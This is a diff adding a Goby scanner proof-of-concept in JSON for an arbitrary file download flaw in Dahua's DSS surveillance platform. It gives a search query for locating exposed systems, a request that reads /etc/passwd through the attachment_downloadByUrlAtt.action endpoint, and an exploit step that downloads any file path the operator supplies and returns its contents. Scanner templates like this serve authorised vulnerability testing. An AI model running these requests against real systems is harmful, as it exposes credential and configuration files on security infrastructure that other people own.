@@ -1,0 +1,96 @@
+{
+      "Name": "大华DSS系统 任意文件下载漏洞",
+      "Level": "3",
+      "Tags": [],
+      "GobyQuery": "title=\"DSS-平安城市\"",
+      "Description": "浙江大华DSS（digital surveillance system）是一款集视频、报警、门禁、对讲四大安防子系统管理功能于一体的综合管理平台。\n浙江大华技术股份有限公司DSS存在任意文件下载漏洞，攻击者可利用该漏洞登录界面下载任意文件获取敏感信息。",
+      "Product": "浙江大华DSS（digital surveillance system）",
+      "Homepage": "https://www.dahuatech.com/",
+      "Author": "ying",
+      "Impact": "",
+      "Recommandation": "",
+      "References": [
+            "https://www.pwnwiki.org/index.php?title=CNVD-2020-61986_%E5%A4%A7%E8%8F%AFDSS%E7%B3%BB%E7%B5%B1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BC%89%E6%BC%8F%E6%B4%9E/zh-cn"
+      ],
+	  "HasExp": true,
+	  "ExpParams": [
+		{
+			"name": "file",
+			"type": "input",
+			"value": "/etc/passwd",
+			"show": ""
+		}
+	  ],
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/itc/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd",
+                        "follow_redirect": false,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "root",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+	  "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/itc/attachment_downloadByUrlAtt.action?filePath=file://{{{file}}}",
+                        "follow_redirect": false,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "root",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+					"output|lastbody"
+				  ]
+            }
+      ],
+      "PostTime": "2021-06-12 22:15:27",
+      "GobyVersion": "1.8.268"
+}
